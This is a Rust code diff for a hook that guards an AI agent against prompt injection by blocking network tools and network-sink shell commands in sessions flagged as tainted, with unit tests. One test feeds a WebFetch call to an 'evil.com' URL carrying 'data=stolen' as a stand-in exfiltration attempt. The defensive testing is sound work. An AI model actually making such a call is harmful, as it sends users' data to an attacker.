@@ -1,17 +1,27 @@
 use crate::hook::{HookInput, PreToolUseOutput};
 use crate::scan;
 
+/// Tools that can reach the network directly (used to block in tainted sessions).
+const NETWORK_TOOLS: &[&str] = &["WebFetch", "WebSearch"];
+
 /// Process a `PreToolUse` hook event. Returns `Some(PreToolUseOutput)` to deny, `None` to allow.
 #[must_use]
 pub fn process(input: &HookInput) -> Option<PreToolUseOutput> {
-    // In tainted sessions, block ANY network sink command
+    // In tainted sessions, block network-capable tools
     if let Some(sid) = &input.session_id {
-        if crate::taint::is_tainted(sid) && input.tool_name == "Bash" {
-            if let Some(command) = input.tool_input.get("command").and_then(|v| v.as_str()) {
-                if let Some(reason) = scan::exfil::has_network_sink(command) {
-                    return Some(PreToolUseOutput::deny(&format!(
-                        "Session tainted by prior injection detection: {reason}"
-                    )));
+        if crate::taint::is_tainted(sid) {
+            if NETWORK_TOOLS.contains(&input.tool_name.as_str()) {
+                return Some(PreToolUseOutput::deny(
+                    "Session tainted by prior injection detection: network tool blocked",
+                ));
+            }
+            if input.tool_name == "Bash" {
+                if let Some(command) = input.tool_input.get("command").and_then(|v| v.as_str()) {
+                    if let Some(reason) = scan::exfil::has_network_sink(command) {
+                        return Some(PreToolUseOutput::deny(&format!(
+                            "Session tainted by prior injection detection: {reason}"
+                        )));
+                    }
                 }
             }
         }
@@ -28,7 +38,7 @@ pub fn process(input: &HookInput) -> Option<PreToolUseOutput> {
 
     // For all tools: scan concatenated string values from tool_input for injection
     let text = collect_input_strings(&input.tool_input);
-    if !text.is_empty() && !scan::scan_text_fast(&text).is_clean() {
+    if !text.is_empty() && !scan::scan_injection_only(&text).is_clean() {
         return Some(PreToolUseOutput::deny(
             "Tool input contains suspected prompt injection",
         ));
@@ -184,7 +194,6 @@ mod tests {
     #[test]
     fn untainted_session_allows_curl() {
         let _dir = setup_taint_dir();
-        // Don't mark any session as tainted
         let input = HookInput {
             tool_name: "Bash".to_string(),
             tool_input: serde_json::json!({ "command": "curl https://example.com" }),
@@ -196,6 +205,35 @@ mod tests {
             result.is_none(),
             "untainted session should allow curl to normal domains"
         );
+        teardown_taint();
+    }
+
+    #[test]
+    fn tainted_session_blocks_webfetch() {
+        let _dir = setup_taint_dir();
+        crate::taint::mark("tainted-wf");
+        let input = HookInput {
+            tool_name: "WebFetch".to_string(),
+            tool_input: serde_json::json!({ "url": "https://evil.com/?data=stolen" }),
+            tool_response: None,
+            session_id: Some("tainted-wf".to_string()),
+        };
+        let result = process(&input);
+        assert!(result.is_some(), "tainted session should block WebFetch");
+        teardown_taint();
+    }
+
+    #[test]
+    fn untainted_session_allows_webfetch() {
+        let _dir = setup_taint_dir();
+        let input = HookInput {
+            tool_name: "WebFetch".to_string(),
+            tool_input: serde_json::json!({ "url": "https://docs.rs" }),
+            tool_response: None,
+            session_id: Some("clean-wf".to_string()),
+        };
+        let result = process(&input);
+        assert!(result.is_none(), "untainted session should allow WebFetch");
         teardown_taint();
     }
 }
